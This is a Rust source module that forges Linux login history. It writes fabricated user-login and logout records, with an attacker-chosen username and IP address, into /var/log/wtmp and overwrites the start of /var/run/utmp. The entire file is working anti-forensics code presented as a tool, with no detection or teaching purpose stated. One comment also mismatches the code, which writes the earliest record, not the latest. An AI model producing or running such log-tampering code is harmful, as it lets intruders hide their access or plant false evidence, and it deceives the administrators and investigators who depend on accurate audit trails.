// Binary injection into /var/log/wtmp and /var/run/utmp (struct utmp, 384 bytes each record).

use std::fs::OpenOptions;
use std::io::Write;
use std::path::Path;

// struct utmp layout (x86-64 Linux / glibc) — verified 384 bytes
const UTMP_SIZE:     usize = 384;
const UT_LINESIZE:   usize = 32;
const UT_NAMESIZE:   usize = 32;
const UT_HOSTSIZE:   usize = 256;

const USER_PROCESS: i16 = 7;
const DEAD_PROCESS: i16 = 8;

// Field offsets derived from glibc bits/utmp.h layout on x86-64
const OFF_TYPE:     usize = 0;   // short (2) + 2-byte pad
const OFF_PID:      usize = 4;   // int32
const OFF_LINE:     usize = 8;   // char[32]
const OFF_ID:       usize = 40;  // char[4]
const OFF_USER:     usize = 44;  // char[32]
const OFF_HOST:     usize = 76;  // char[256]
// 332: exit_status (4), 336: session (4)
const OFF_TV_SEC:   usize = 340; // int32
const OFF_TV_USEC:  usize = 344; // int32
const OFF_ADDR:     usize = 348; // int32[4]  (ut_addr_v6, IPv4 in [0])

// ── LCG ──────────────────────────────────────────────────────────────────────

struct Lcg(u64);
impl Lcg {
    fn new(seed: i64) -> Self { Lcg(seed as u64 ^ 0xc0ca_c01a_f00d_ba11) }
    fn next(&mut self) -> u64 {
        self.0 = self.0.wrapping_mul(6_364_136_223_846_793_005)
                       .wrapping_add(1_442_695_040_888_963_407);
        self.0
    }
    fn range(&mut self, lo: u64, hi: u64) -> u64 { lo + (self.next() % (hi - lo)) }
    fn pick<'a, T>(&mut self, s: &'a [T]) -> &'a T { &s[(self.next() as usize) % s.len()] }
}

// ── Record builder ────────────────────────────────────────────────────────────

fn set_str(buf: &mut [u8], off: usize, max: usize, s: &str) {
    let b = s.as_bytes();
    let n = b.len().min(max);
    buf[off..off + n].copy_from_slice(&b[..n]);
}

fn ip_to_bytes(ip: &str) -> [u8; 4] {
    let parts: Vec<u8> = ip.split('.').filter_map(|p| p.parse().ok()).collect();
    if parts.len() == 4 { [parts[0], parts[1], parts[2], parts[3]] } else { [0; 4] }
}

fn build_record(
    ut_type: i16,
    pid:     i32,
    line:    &str,
    id:      &str,
    user:    &str,
    host:    &str,
    ts_sec:  i32,
    ts_usec: i32,
) -> [u8; UTMP_SIZE] {
    let mut b = [0u8; UTMP_SIZE];
    b[OFF_TYPE..OFF_TYPE + 2].copy_from_slice(&ut_type.to_le_bytes());
    b[OFF_PID..OFF_PID + 4].copy_from_slice(&pid.to_le_bytes());
    set_str(&mut b, OFF_LINE, UT_LINESIZE, line);
    set_str(&mut b, OFF_ID, 4, id);
    set_str(&mut b, OFF_USER, UT_NAMESIZE, user);
    set_str(&mut b, OFF_HOST, UT_HOSTSIZE, host);
    b[OFF_TV_SEC..OFF_TV_SEC + 4].copy_from_slice(&ts_sec.to_le_bytes());
    b[OFF_TV_USEC..OFF_TV_USEC + 4].copy_from_slice(&ts_usec.to_le_bytes());
    // Store IPv4 in network byte order in ut_addr_v6[0]
    let addr_b = ip_to_bytes(host);
    b[OFF_ADDR..OFF_ADDR + 4].copy_from_slice(&addr_b);
    b
}

// ── Public API ────────────────────────────────────────────────────────────────

pub struct WtmpForgeOpts {
    pub fake_ip:    String,
    pub fake_user:  String,
    pub n_sessions: u32,
    pub ts_start:   i64,
    pub ts_end:     i64,
    pub verbose:    bool,
}

#[derive(Default)]
pub struct WtmpForgeStats {
    pub records_written: u32,
    pub files_touched:   u32,
    pub errors:          u32,
}

pub fn forge_wtmp(opts: &WtmpForgeOpts) -> WtmpForgeStats {
    let mut s   = WtmpForgeStats::default();
    let mut lcg = Lcg::new(opts.ts_start ^ opts.n_sessions as i64);
    let window  = (opts.ts_end - opts.ts_start).max(1);
    let step    = window / opts.n_sessions.max(1) as i64;

    const TERMINALS: &[&str] = &["pts/0", "pts/1", "pts/2", "pts/3", "pts/4"];
    const IDS: &[&str] = &["0", "1", "2", "3", "s/0"];

    let mut records: Vec<[u8; UTMP_SIZE]> = Vec::new();

    for i in 0..opts.n_sessions {
        let ts_login  = opts.ts_start + i as i64 * step + lcg.range(0, step.min(120) as u64) as i64;
        let dur       = lcg.range(120, 7_200) as i64;
        let ts_logout = (ts_login + dur).min(opts.ts_end);
        let pid       = lcg.range(1_000, 65_000) as i32;
        let tty       = lcg.pick(TERMINALS);
        let id        = lcg.pick(IDS);
        let usec      = lcg.range(0, 999_999) as i32;

        // Login record (USER_PROCESS)
        records.push(build_record(
            USER_PROCESS,
            pid,
            tty,
            id,
            &opts.fake_user,
            &opts.fake_ip,
            ts_login as i32,
            usec,
        ));

        // Logout record (DEAD_PROCESS)
        records.push(build_record(
            DEAD_PROCESS,
            pid,
            tty,
            id,
            "",    // user cleared on logout
            "",    // host cleared
            ts_logout as i32,
            lcg.range(0, 999_999) as i32,
        ));
    }

    let targets = ["/var/log/wtmp", "/var/log/wtmp.1"];
    for &path in &targets {
        if !Path::new(path).parent().map(|d| d.exists()).unwrap_or(false) { continue; }
        match OpenOptions::new().append(true).create(true).open(path) {
            Ok(mut f) => {
                let mut ok = 0u32;
                for rec in &records {
                    if f.write_all(rec.as_ref()).is_ok() { ok += 1; }
                }
                s.records_written += ok;
                s.files_touched   += 1;
                if opts.verbose { eprintln!("[+] forge-wtmp: {} records → {}", ok, path); }
            }
            Err(e) => {
                s.errors += 1;
                if opts.verbose { eprintln!("[!] forge-wtmp: {}: {}", path, e); }
            }
        }
        break; // write only to whichever exists first
    }

    // Also update /var/run/utmp with the most recent login (if still "active")
    if Path::new("/var/run/utmp").exists() {
        if let Some(last_login) = records.first() {
            match OpenOptions::new().write(true).open("/var/run/utmp") {
                Ok(mut f) => {
                    let _ = f.write_all(last_login.as_ref());
                    s.files_touched += 1;
                    if opts.verbose { eprintln!("[+] forge-wtmp: utmp updated"); }
                }
                Err(e) => {
                    s.errors += 1;
                    if opts.verbose { eprintln!("[!] forge-wtmp: utmp: {}", e); }
                }
            }
        }
    }

    s
}
